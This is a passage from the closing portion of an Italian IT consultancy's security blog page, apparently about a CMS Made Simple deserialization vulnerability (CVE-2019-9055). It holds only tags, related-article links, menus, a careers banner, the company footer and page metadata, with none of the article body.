    <p class="m-0">
                    CMS            </p>
</a>
            </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/RCE" title="RCE">
    <p class="m-0">
                    RCE            </p>
</a>
            </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/deserialization" title="deserialization">
    <p class="m-0">
                    deserialization            </p>
</a>
            </li>
            </ul>
</div>
                                    </div>
            </div>
        </div>
    </section>
    </main>
<section class="section-spaced">
    <div class="container">
        <div class="row">
    <div class="col-12">
                    <h3 class="font-weight-bold text-black">
                <strong>Articoli correlati</strong>
            </h3>
                            <p>
                             </p>
            </div>
</div>
        <div class="row">
                            <div class="col-12 col-md-6 col-lg-4">
                    
<a href="/it/articolo/security/weak-password-or-weak-hash-function" title="Weak password or weak hash function" class="text-dark text-decoration-none">
    <div class="image-with-text image-with-text--small image-with-text--card image-with-text--related card border-radius-0 mb-3 related">
                    <div class="image-with-text-image"
                 style="background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg'); -moz-background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg'); -o-background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg')">
            </div>
                <div class="image-with-text-content image-with-text-content--black ">
                            <div class="text-muted mb-2"><small>Novembre, 2020</small></div>
                        <h5 class="syncopate text-uppercase fixed-4-line"><strong>
                    Weak password or weak hash function                </strong>
            </h5>
            <p class="font-weight-light text-truncate mb-0 d-none">
                <small>A new tragedy</small>
            </p>
                            <p class="font-weight-light text-truncate">
                    <small>Dario Ragno</small>
                </p>
                    </div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
                </div>
                            <div class="col-12 col-md-6 col-lg-4">
                    
<a href="/it/articolo/security/sqli-exploiting-with-overflow-handling" title="SQLi exploiting with overflow handling" class="text-dark text-decoration-none">
    <div class="image-with-text image-with-text--small image-with-text--card image-with-text--related card border-radius-0 mb-3 related">
                    <div class="image-with-text-image"
                 style="background-image: url('/_default_upload_bucket/image-thumb__374__default/out-of-range-overflow-handling-sqli.png'); -moz-background-image: url('/_default_upload_bucket/image-thumb__374__default/out-of-range-overflow-handling-sqli.png'); -o-background-image: url('/_default_upload_bucket/image-thumb__374__default/out-of-range-overflow-handling-sqli.png'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__374__default/out-of-range-overflow-handling-sqli.png')">
            </div>
                <div class="image-with-text-content image-with-text-content--black ">
                            <div class="text-muted mb-2"><small>Ottobre, 2020</small></div>
                        <h5 class="syncopate text-uppercase fixed-4-line"><strong>
                    SQLi exploiting with overflow handling                </strong>
            </h5>
            <p class="font-weight-light text-truncate mb-0 d-none">
                <small>Blind Boolean Based SQLi</small>
            </p>
                            <p class="font-weight-light text-truncate">
                    <small>Riccardo Krauter</small>
                </p>
                    </div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
                </div>
                            <div class="col-12 col-md-6 col-lg-4">
                    
<a href="/it/articolo/security/have-fun-with-file-extension-and-upload" title="Have fun with file extension and file upload (cve-2019-16318)" class="text-dark text-decoration-none">
    <div class="image-with-text image-with-text--small image-with-text--card image-with-text--related card border-radius-0 mb-3 related">
                    <div class="image-with-text-image"
                 style="background-image: url('/Articoli/have-fun-with-file-extension-and-file-upload/image-thumb__355__default/pimcore-file-extension-truncation-rce.png'); -moz-background-image: url('/Articoli/have-fun-with-file-extension-and-file-upload/image-thumb__355__default/pimcore-file-extension-truncation-rce.png'); -o-background-image: url('/Articoli/have-fun-with-file-extension-and-file-upload/image-thumb__355__default/pimcore-file-extension-truncation-rce.png'); -webkit-background-image: url('/Articoli/have-fun-with-file-extension-and-file-upload/image-thumb__355__default/pimcore-file-extension-truncation-rce.png')">
            </div>
                <div class="image-with-text-content image-with-text-content--black ">
                            <div class="text-muted mb-2"><small>Settembre, 2020</small></div>
                        <h5 class="syncopate text-uppercase fixed-4-line"><strong>
                    Have fun with file extension and file upload (cve-2019-16318)                </strong>
            </h5>
            <p class="font-weight-light text-truncate mb-0 d-none">
                <small>Filename size matter!</small>
            </p>
                            <p class="font-weight-light text-truncate">
                    <small>Daniele Scanu</small>
                </p>
                    </div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
                </div>
                    </div>
    </div>
</section>
<section class="section-spaced">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <h3 class="font-weight-bold text-black">
                    <strong>Security</strong>
                </h3>
                <p>
                                    </p>
            </div>
        </div>
                        <div class="row">
            <div class="col-12 col-md-12 col-lg-6 mb-4">
                
<a href="/it/articolo/security/from-broken-access-control-to-rce" title="From broken access control to RCE on Total.js CMS (CVE-2019- 15954 & CVE-2019-15953)">
    <div class="image-with-text image-with-text--highlight">
        <div class="image-with-text-content image-with-text-content--white ">
            <h2 class="syncopate text-uppercase">
                <strong>From broken access control to RCE on Total.js CMS (CVE-2019- 15954 & CVE-2019-15953)</strong>
            </h2>
            <p class="text-truncate font-weight-light">TL;DR</p>
            <div class="read-more font-small">Leggi</div>
        </div>
        <div class="image-with-text-cover image-with-text-cover--black"></div>
        <div class="image-with-text-image   image-height" style="background-image: url('/Articoli/From-broken-access/image-thumb__326__default/blog%20cmg_totaljs_def.pjpeg'); -moz-background-image: url('/Articoli/From-broken-access/image-thumb__326__default/blog%20cmg_totaljs_def.pjpeg'); -o-background-image: url('/Articoli/From-broken-access/image-thumb__326__default/blog%20cmg_totaljs_def.pjpeg'); -webkit-background-image: url('/Articoli/From-broken-access/image-thumb__326__default/blog%20cmg_totaljs_def.pjpeg')"></div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
            </div>
            <div class="col-12 col-md-12 col-lg-6">
                <div class="heightToCopy">
                    <div class="row mb-0">
                        <div class="col-12">
                            <ul class="list-unstyled card-small-list m-0">
                                                                    <li>
                                        
<a href="/it/articolo/security/Intervista-Francesco-Bergadano" title="Intervista a Francesco Bergadano sul tema Industry 4.0: evoluzioni e cybersecurity " class="text-decoration-none">
    <div class="image-with-text border image-with-text--small image-with-text--card bg-white">
        <div class="image-with-text-image"
             style="background-image: url('/Articoli/Intervista-Francesco-Bergadano/image-thumb__297__default/earth-2254769_1920.pjpeg'); -moz-background-image: url('/Articoli/Intervista-Francesco-Bergadano/image-thumb__297__default/earth-2254769_1920.pjpeg'); -o-background-image: url('/Articoli/Intervista-Francesco-Bergadano/image-thumb__297__default/earth-2254769_1920.pjpeg'); -webkit-background-image: url('/Articoli/Intervista-Francesco-Bergadano/image-thumb__297__default/earth-2254769_1920.pjpeg')">
        </div>
        <div class="image-with-text-content image-with-text-content--black ">
                            <div class="text-muted mb-2"><small>Luglio, 2020</small></div>
                        <h5 class="syncopate text-uppercase fixed-4-line"><strong>Intervista a Francesco Bergadano sul tema Industry 4.0: evoluzioni e cybersecurity </strong></h5>
            <p class="text-truncate mb-2"><small>Gemma Contini</small></p>
        </div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
                                    </li>
                                                                    <li>
                                        
<a href="/it/articolo/security/weaponize--order-by--sqli-on-wordpress-form-maker-" title="Weaponize 'order by' SQLi on WordPress Form Maker plugin (CVE-2019-10866)" class="text-decoration-none">
    <div class="image-with-text border image-with-text--small image-with-text--card bg-white">
        <div class="image-with-text-image"
             style="background-image: url('/_default_upload_bucket/image-thumb__273__default/copertina6.png'); -moz-background-image: url('/_default_upload_bucket/image-thumb__273__default/copertina6.png'); -o-background-image: url('/_default_upload_bucket/image-thumb__273__default/copertina6.png'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__273__default/copertina6.png')">
        </div>
        <div class="image-with-text-content image-with-text-content--black ">
                            <div class="text-muted mb-2"><small>Maggio, 2020</small></div>
                        <h5 class="syncopate text-uppercase fixed-4-line"><strong>Weaponize 'order by' SQLi on WordPress Form Maker plugin (CVE-2019-10866)</strong></h5>
            <p class="text-truncate mb-2"><small>Daniele Scanu</small></p>
        </div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
                                    </li>
                                                                    <li>
                                        
<a href="/it/articolo/security/domoticz--from-zero-to-shell--cve-2019-10664-and-c" title="Domoticz: from zero to shell (CVE-2019-10664 and CVE-2019-10678)" class="text-decoration-none">
    <div class="image-with-text border image-with-text--small image-with-text--card bg-white">
        <div class="image-with-text-image"
             style="background-image: url('/_default_upload_bucket/image-thumb__262__default/cracked-bricks-last.png'); -moz-background-image: url('/_default_upload_bucket/image-thumb__262__default/cracked-bricks-last.png'); -o-background-image: url('/_default_upload_bucket/image-thumb__262__default/cracked-bricks-last.png'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__262__default/cracked-bricks-last.png')">
        </div>
        <div class="image-with-text-content image-with-text-content--black ">
                            <div class="text-muted mb-2"><small>Aprile, 2020</small></div>
                        <h5 class="syncopate text-uppercase fixed-4-line"><strong>Domoticz: from zero to shell (CVE-2019-10664 and CVE-2019-10678)</strong></h5>
            <p class="text-truncate mb-2"><small>Fabio Carretto</small></p>
        </div>
        <div class="tagged-category" style="background-color: #c03a2b">
            <span>Security</span>
        </div>
    </div>
</a>
                                    </li>
                                                                                                    <li>
                                        
<a href="/it/categoria/security" title="Security">
    <div class="image-with-text border image-with-text--small">
        <div class="image-with-text-content image-with-text-content--white category-list">
            <img src="/Categorie/security.svg" alt="security" width="50px">
            <h3 class="syncopate text-uppercase mt-4">Security</h3>
        </div>
        <div class="image-with-text--card" style="background-color: #c03a2b"></div>
    </div>
</a>
                                    </li>
                                                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
            </div>
</section>
<section class="section-spaced">
    <div class="container">
        <div class="row">
    <div class="col-12">
                    <h3 class="font-weight-bold text-black">
                <strong>Articoli in evidenza</strong>
            </h3>
                    </div>
</div>

        <div class="row">
                                <div class="col-12 col-md-6 mb-4">
                        <div class="listed-article">
                            <a href="/it/articolo/software/certimeter_silver_partner_di_pimcore" title="Certimeter è silver partner di Pimcore" class="d-flex flex-column flex-lg-row text-decoration-none">
                                <div class="listed-article-img mr-3 position-relative" style="background-image: url('/Articoli/image-thumb__31__default/certimetergroup_pimcore_team_1.pjpeg'); -moz-background-image: url('/Articoli/image-thumb__31__default/certimetergroup_pimcore_team_1.pjpeg'); -o-background-image: url('/Articoli/image-thumb__31__default/certimetergroup_pimcore_team_1.pjpeg'); -webkit-background-image: url('/Articoli/image-thumb__31__default/certimetergroup_pimcore_team_1.pjpeg')">
                                    <div class="tagged-category" style="background-color: #2980b9">
                                        <span>Software</span>
                                    </div>
                                </div>
                                <div>
                                    <p class="mb-1">
                                                                                    <small>Gennaio, 2020</small>
                                                                                                                            | <small>Gemma Contini, Stefano Spagnolo</small>
                                                                            </p>
                                    <h6 class="syncopate mb-1 fixed-3-line text-uppercase">
                                        <strong>Certimeter è silver partner di Pimcore</strong>
                                    </h6>
                                    <p class="font-small fixed-1-line d-none d-lg-block">
                                       Realizziamo soluzioni enterprise per i nostri clienti.                                    </p>
                                    <div class="read-more font-small">Leggi</div>
                                </div>
                            </a>
                        </div>
                    </div>
                                <div class="col-12 col-md-6 mb-4">
                        <div class="listed-article">
                            <a href="/it/articolo/security/weak-password-or-weak-hash-function" title="Weak password or weak hash function" class="d-flex flex-column flex-lg-row text-decoration-none">
                                <div class="listed-article-img mr-3 position-relative" style="background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg'); -moz-background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg'); -o-background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__376__default/weak-password-or-weah-hash-function.pjpeg')">
                                    <div class="tagged-category" style="background-color: #c03a2b">
                                        <span>Security</span>
                                    </div>
                                </div>
                                <div>
                                    <p class="mb-1">
                                                                                    <small>Novembre, 2020</small>
                                                                                                                            | <small>Dario Ragno</small>
                                                                            </p>
                                    <h6 class="syncopate mb-1 fixed-3-line text-uppercase">
                                        <strong>Weak password or weak hash function</strong>
                                    </h6>
                                    <p class="font-small fixed-1-line d-none d-lg-block">
                                       A new tragedy                                    </p>
                                    <div class="read-more font-small">Leggi</div>
                                </div>
                            </a>
                        </div>
                    </div>
                                <div class="col-12 col-md-6 mb-4">
                        <div class="listed-article">
                            <a href="/it/articolo/data_analysis/visualizzare-dati-multivariati" title="Visualizzare dati multivariati" class="d-flex flex-column flex-lg-row text-decoration-none">
                                <div class="listed-article-img mr-3 position-relative" style="background-image: url('/Articoli/visualizzare-dati-multivariati/image-thumb__344__default/iris-black.png'); -moz-background-image: url('/Articoli/visualizzare-dati-multivariati/image-thumb__344__default/iris-black.png'); -o-background-image: url('/Articoli/visualizzare-dati-multivariati/image-thumb__344__default/iris-black.png'); -webkit-background-image: url('/Articoli/visualizzare-dati-multivariati/image-thumb__344__default/iris-black.png')">
                                    <div class="tagged-category" style="background-color: #16a084">
                                        <span>Data Analysis</span>
                                    </div>
                                </div>
                                <div>
                                    <p class="mb-1">
                                                                                    <small>Settembre, 2020</small>
                                                                                                                            | <small>Giancarlo Ruffo</small>
                                                                            </p>
                                    <h6 class="syncopate mb-1 fixed-3-line text-uppercase">
                                        <strong>Visualizzare dati multivariati</strong>
                                    </h6>
                                    <p class="font-small fixed-1-line d-none d-lg-block">
                                       Perchè sembra facile solo dopo che il risultato è stato realizzato                                    </p>
                                    <div class="read-more font-small">Leggi</div>
                                </div>
                            </a>
                        </div>
                    </div>
                                <div class="col-12 col-md-6 mb-4">
                        <div class="listed-article">
                            <a href="/it/articolo/miscellaneous/it-s-geek-pride-day" title="It’s geek pride day" class="d-flex flex-column flex-lg-row text-decoration-none">
                                <div class="listed-article-img mr-3 position-relative" style="background-image: url('/Articoli/geek-pride-day/image-thumb__396__default/geek-pride-day-post-cover.png'); -moz-background-image: url('/Articoli/geek-pride-day/image-thumb__396__default/geek-pride-day-post-cover.png'); -o-background-image: url('/Articoli/geek-pride-day/image-thumb__396__default/geek-pride-day-post-cover.png'); -webkit-background-image: url('/Articoli/geek-pride-day/image-thumb__396__default/geek-pride-day-post-cover.png')">
                                    <div class="tagged-category" style="background-color: #fd00be">
                                        <span>Miscellaneous</span>
                                    </div>
                                </div>
                                <div>
                                    <p class="mb-1">
                                                                                    <small>Maggio, 2021</small>
                                                                                                                            | <small>Gemma Contini</small>
                                                                            </p>
                                    <h6 class="syncopate mb-1 fixed-3-line text-uppercase">
                                        <strong>It’s geek pride day</strong>
                                    </h6>
                                    <p class="font-small fixed-1-line d-none d-lg-block">
                                       Let’s celebrate!                                    </p>
                                    <div class="read-more font-small">Leggi</div>
                                </div>
                            </a>
                        </div>
                    </div>
                    </div>
            </div>
</section>
<section class="section-spaced">
    <div class="container">
        <div class="row">
            <div class="col-12 col-md-6">
                <div class="row">
                    <div class="col-12">
                        <h3 class="font-weight-bold text-black">
                            <strong>Categorie</strong>
                        </h3>
                                                    <a href="/it/categoria/software" title="Software" class="text-decoration-none">
                                <div class="category-list border shadow-sm d-inline-block mb-2" style="min-width: 49%; background-color: #2980b9">
                                                                            <img class="d-inline" src="/Categorie/software.svg" alt="Software" width="30px">
                                                                        <small class="d-inline syncopate text-uppercase">Software</small>
                                </div>
                            </a>
                                                    <a href="/it/categoria/security" title="Security" class="text-decoration-none">
                                <div class="category-list border shadow-sm d-inline-block mb-2" style="min-width: 49%; background-color: #c03a2b">
                                                                            <img class="d-inline" src="/Categorie/security.svg" alt="Security" width="30px">
                                                                        <small class="d-inline syncopate text-uppercase">Security</small>
                                </div>
                            </a>
                                                    <a href="/it/categoria/data_analysis" title="Data Analysis" class="text-decoration-none">
                                <div class="category-list border shadow-sm d-inline-block mb-2" style="min-width: 49%; background-color: #16a084">
                                                                            <img class="d-inline" src="/Categorie/data-analysis.svg" alt="Data Analysis" width="30px">
                                                                        <small class="d-inline syncopate text-uppercase">Data Analysis</small>
                                </div>
                            </a>
                                                    <a href="/it/categoria/miscellaneous" title="Miscellaneous" class="text-decoration-none">
                                <div class="category-list border shadow-sm d-inline-block mb-2" style="min-width: 49%; background-color: #fd00be">
                                                                            <img class="d-inline" src="/Categorie/miscellaneous.svg" alt="" width="30px">
                                                                        <small class="d-inline syncopate text-uppercase">Miscellaneous</small>
                                </div>
                            </a>
                                            </div>
                </div>
            </div>
            <div class="col-12 col-md-6 mt-4 mt-md-0">
                <div class="row">
                    <div class="col-12">
                                                    <h3 class="font-weight-bold text-black">
                                <strong>Tags</strong>
                            </h3>
                            <section class="">
    <div class="container pl-0">
                <div class="row">
            <div class="col-12">
                <ul class="tags-list list-unstyled list-inline align-self-center m-0">
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/CMS" title="CMS">
    <p class="m-0">
                    CMS            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/pimcore" title="pimcore">
    <p class="m-0">
                    pimcore            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/sviluppo" title="sviluppo">
    <p class="m-0">
                    sviluppo            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/data%20exfiltration" title="data exfiltration">
    <p class="m-0">
                    data exfiltration            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/machine%20learning" title="machine learning">
    <p class="m-0">
                    machine learning            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/pim" title="pim">
    <p class="m-0">
                    pim            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/marketing" title="marketing">
    <p class="m-0">
                    marketing            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/data%20viz" title="data viz">
    <p class="m-0">
                    data viz            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/pimcore-PIM-DAM" title="pimcore-PIM-DAM">
    <p class="m-0">
                    pimcore-PIM-DAM            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/artificial%20intelligence" title="artificial intelligence">
    <p class="m-0">
                    artificial intelligence            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/RCE" title="RCE">
    <p class="m-0">
                    RCE            </p>
</a>
                            </div>
                        </li>
                                            <li class="list-inline-item tags-list-item mb-2">
                            <div class="d-inline-block align-middle tags">
                                <a href=" /it/tag/logistica" title="logistica">
    <p class="m-0">
                    logistica            </p>
</a>
                            </div>
                        </li>
                                    </ul>
            </div>
        </div>
    </div>
</section>
                                            </div>
                </div>
            </div>
        </div>
    </div>
</section>


<section class="section-spaced">
    <div class="container">
        <div class="row d-md-flex align-items-lg-center">
            <div class="col-6">
                <h3 class="font-weight-bold text-black">
                    <strong>Approfondimenti</strong>
                </h3>
                <p> </p>
            </div>
            <div class="col-6 text-right">
                <button class="btn btn-light custom-carousel-btn-prev">
                    <span class="fa fa-arrow-left"></span>
                </button>
                <button class="btn btn-light custom-carousel-btn-next">
                    <span class="fa fa-arrow-right"></span>
                </button>
            </div>
        </div>
        <div class="row">
    <div class="col-12">
        <div class="featured-article-carousel">
            <div class="owl-carousel owl-theme">
                                    <div class="item">
                        <a href="/it/articolo/software/certimeter_silver_partner_di_pimcore"
                           title="Certimeter è silver partner di Pimcore"
                           target="_self">
                            <div class="featured-article featured-article-cover featured-article-cover--black d-flex flex-column align-items-center justify-content-center card related">
                                <div class="featured-article-content featured-article-content--white">
                                    <h3 class="syncopate">
                                        AGGIORNA I TUOI <strong>PRODOTTI</strong> E DISTRIBUISCILI SU TUTTI I <strong>CANALI DI VENDITA</strong>                                    </h3>
                                    <p>
                                        Scegli Pimcore                                    </p>
                                </div>
                                                                    <div class="featured-article-image" style="background-image: url('/Approfondimenti/image-thumb__68__default/pimcore.png'); -moz-background-image: url('/Approfondimenti/image-thumb__68__default/pimcore.png'); -o-background-image: url('/Approfondimenti/image-thumb__68__default/pimcore.png'); -webkit-background-image: url('/Approfondimenti/image-thumb__68__default/pimcore.png')"></div>
                                                            </div>
                        </a>
                    </div>
                                    <div class="item">
                        <a href="https://www.resisite.com/"
                           title="Resisite"
                           target="_blank">
                            <div class="featured-article featured-article-cover featured-article-cover--black d-flex flex-column align-items-center justify-content-center card related">
                                <div class="featured-article-content featured-article-content--white">
                                    <h3 class="syncopate">
                                        <strong>PROTEGGI IL TUO BRAND:</strong> SCOPRI E NEUTRALIZZA GLI ATTACCHI                                    </h3>
                                    <p>
                                        Scegli Resisite                                    </p>
                                </div>
                                                                    <div class="featured-article-image" style="background-image: url('/_default_upload_bucket/image-thumb__64__default/resisite-header-image-3.pjpeg'); -moz-background-image: url('/_default_upload_bucket/image-thumb__64__default/resisite-header-image-3.pjpeg'); -o-background-image: url('/_default_upload_bucket/image-thumb__64__default/resisite-header-image-3.pjpeg'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__64__default/resisite-header-image-3.pjpeg')"></div>
                                                            </div>
                        </a>
                    </div>
                                    <div class="item">
                        <a href="/it/articolo/software/crm_e_cloud_computing_per_far_crescere_l-azienda"
                           title="CRM e Cloud Computing per far crescere l'azienda"
                           target="_self">
                            <div class="featured-article featured-article-cover featured-article-cover--black d-flex flex-column align-items-center justify-content-center card related">
                                <div class="featured-article-content featured-article-content--white">
                                    <h3 class="syncopate">
                                        <strong>CRM</strong> E <strong>CLOUD COMPUTING</strong> PER FAR CRESCERE LA TUA AZIENDA                                    </h3>
                                    <p>
                                        scegli Salesforce                                    </p>
                                </div>
                                                                    <div class="featured-article-image" style="background-image: url('/_default_upload_bucket/image-thumb__65__default/Schermata%202019-12-15%20alle%2003.27.12.png'); -moz-background-image: url('/_default_upload_bucket/image-thumb__65__default/Schermata%202019-12-15%20alle%2003.27.12.png'); -o-background-image: url('/_default_upload_bucket/image-thumb__65__default/Schermata%202019-12-15%20alle%2003.27.12.png'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__65__default/Schermata%202019-12-15%20alle%2003.27.12.png')"></div>
                                                            </div>
                        </a>
                    </div>
                            </div>
        </div>
    </div>
</div>
    </div>
</section>
<!-- /main-content -->

<section id="careers" class="careers careers-bg medium_height commonSection" style="background-image: url('/Image/image-thumb__66__footer/certimetergroup-bg-top-slider-1.pjpeg')">
    <div class="container">
        <div class="row">
            <div class="">
                <div class="careers-wrapper vertical_align">
                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                        <div class="text-center section-title_and_subtitle">
                            <h2 class="text-career text-uppercase font-weight-bold syncopate">
                                UNISCITI A NOI. INVIA LA TUA CANDIDATURA </h2>
                            <p class="text-bold">
                                <p>Certimeter Group crede nei <strong>valori</strong>, nella <strong>passione</strong> e nella <strong>professionalità</strong> delle persone.</p>
                            </p>
                            <br>
                            <div class="careers-cta">
                                <a title="Lavora con noi" href="https://www.certimetergroup.com/lavora-con-noi"
                                   class="btn btn-border_white btn-certimeter btn-square btn-min_width">
                                    LAVORA CON NOI                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>
<footer id="main-footer">
    <div class="container" itemscope="" itemtype="https://schema.org/Corporation">
        <div class="row">
            <div class="col-sm-12 col-md-3">
                <div class="inner">

                    <ul>
                        <li>
                                                            <a href="/it" title="CMG-BLOG">
                                    <img class="footer-logo img-responsive" alt="Certimeter Group" title="Certimeter Group" src="/logo/CMG-BLOG-LOGO-NERO_1200.png" />                                </a>
                                                    </li>
                        <li>
                            <ul>
	<li><span itemprop="description">Certimeter Group è un gruppo di aziende&nbsp;di consulenza informatica specializzato in soluzioni ICT.</span></li>
	<li>P.IVA <span itemprop="name">Certimeter S.r.l.</span>: <span itemprop="vatID">04038210961</span></li>
	<li>E-mail: <a class="email_footer" content="info@certimetergroup.com" href="mailto:info@certimetergroup.com" itemprop="email" style="box-sizing: border-box; color: rgb(39, 170, 225); text-decoration-line: none; background-color: transparent;" title="CertimeterGroup Email">info@certimetergroup.com</a></li>
</ul>
                        </li>
                    </ul>
                </div>
            </div>
                        <br>
            <div class="col-sm-12 col-md-6">
                <div class="row no-padding">
                                                                                        
                        <div class="col-sm-12 col-md-6">
                            <div class="inner">
                                <ul itemprop="address" itemscope="" itemtype="https://schema.org/PostalAddress">
                                    <li itemprop="addressLocality"><h5>TORINO</h5></li>
                                    <li><br></li>
                                    <li>Sede legale e sede operativa</li>
                                    <li itemprop="streetAddress">Corso Svizzera, 185 - 10149</li>
                                    <li itemprop="postOfficeBoxNumber"></li>
                                    <li><ul>
	<li>Torino (<span itemprop="addressRegion">TO</span>)</li>
	<li>Telefono: <span content="+390117741894" itemprop="telephone">(+39) 011 7741894</span></li>
	<li>Fax: <span content="+390110432797" itemprop="faxNumber">011 0432797</span></li>
</ul>
</li>
                                </ul>
                            </div>
                        </div>

                                                                                                                    
                        <div class="col-sm-12 col-md-6">
                            <div class="inner">
                                <ul itemprop="address" itemscope="" itemtype="https://schema.org/PostalAddress">
                                    <li itemprop="addressLocality"><h5>MILANO</h5></li>
                                    <li><br></li>
                                    <li>Sede operativa</li>
                                    <li itemprop="streetAddress">Piazza IV Novembre, 4 - 20124</li>
                                    <li itemprop="postOfficeBoxNumber"></li>
                                    <li><ul>
	<li>Milano (<span itemprop="addressRegion">MI</span>)</li>
	<li>Telefono: <span content="+3902671658207" itemprop="telephone">(+39) 02 671658207</span></li>
	<li>Fax: <span content="+390267165266" itemprop="faxNumber">02 67165266</span></li>
</ul>
</li>
                                </ul>
                            </div>
                        </div>

                                                                                                        </div>
            </div>
            <div class="col-sm-12 col-md-3">
                <div class="inner" itemscope="" itemtype="https://schema.org/Organization">

                    <ul>
                        <li><h5>Social</h5></li>
                        <li><br></li>
                                                                                                        
                                                            <li class="mb10">
                                    <a  title="Linkedin" href="https://www.linkedin.com/company/certimetergroup" target="_blank">
                                        <i class="fab fa-linkedin">

                                        </i> Linkedin</a>
                                </li>
                            

                                                                                                                                        
                                                            <li class="mb10">
                                    <a  title="Facebook" href="https://www.facebook.com/CertimeterGroup/" target="_blank">
                                        <i class="fab fa-facebook-square">

                                        </i> Facebook</a>
                                </li>
                            

                                                                                                                            </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid">
        <div class="row no-padding copy">
            <div class="col-md-12">
                <div class="">
                    <div class="copy-content">
                        <p>
                            <p>© Certimeter S.r.l. - Tutti i diritti riservati -&nbsp;<a href="https://www.certimetergroup.com" target="_blank">www.certimetergroup.com</a></p>
                                                                                                            </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- JS -->
<script async="async" defer="defer" src="https://www.google.com/recaptcha/api.js?render=6Lduvu0UAAAAAMsldA72xhMK7IZ8BGIYw5CSeJ6E"></script>
<!--[if lt IE 9]><script src="/cache-buster-1576084588/assets/js/ie8/respond-1.4.2.min.js"></script><![endif]-->
<script>
    //<!--
    var ENV = {
                // Search path
                "searchFree": "",

                // Paths
                "appRoot": "/",
                "assetsRoot": "/assets",
            };
            var LABELS = {
                "cookieLayer" : {
                    "title" : 'Preferenze consenso sui cookie',
                    "content" : 'Utilizziamo cookie tecnici e di terze parti per poterti offrire una migliore esperienza di navigazione e cookie di analytics per raccogliere dati in forma aggregata. Per saperne di più leggi la nostra&nbsp;',
                    "accept" : 'Accetta',
                    "refuse" : 'Rifiuta',
                    "CTA" : '<a href="/it/privacy-policy" title="Privacy Policy.">Privacy Policy.</a>'
                },

            };
            var acceptCookieOnScroll = '';
            var privacyPolicyUrl = "/it/privacy-policy";    //-->
</script>
<script src="/cache-buster-1588539964/assets/js/lib/lib.js"></script>
<script src="/cache-buster-1587662426/assets/js/scripts.js"></script>
<script src="/cache-buster-1561709048/bundles/app/js/ckeditor/plugins/codesnippet/lib/highlight/highlight.pack.js"></script>
<script>
    //<!--
    hljs.initHighlightingOnLoad();    //-->
</script>
<script type="application/ld+json">
    //<!--
    {
    "@context": "https://schema.org",
    "@type": "Article",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://blog.certimetergroup.com/it/articolo/security/CMS_Made_Simple_deserialization_attack_%28CVE-2019-9055%29"
    },
    "headline": "CMS Made Simple deserialization attack (CVE-2019-9055)",
    "description": "Dalla gestione degli errori a RCE",
    "image": "http://blog.certimetergroup.com/_default_upload_bucket/image-thumb__159__cover_share_original/CMSMS-deserialization-attack-CVE-2019-9055.jpg",
    "author": {
        "@type": "Person",
        "name": "Daniele Scanu"
    },
    "publisher": {
        "@type": "Organization",
        "name": "Certimeter Group",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.certimetergroup.com/logo/logo_certimetergroup_sd_59h.png",
            "width": 150,
            "height": 59
        }
    },
    "datePublished": "2020-01-13",
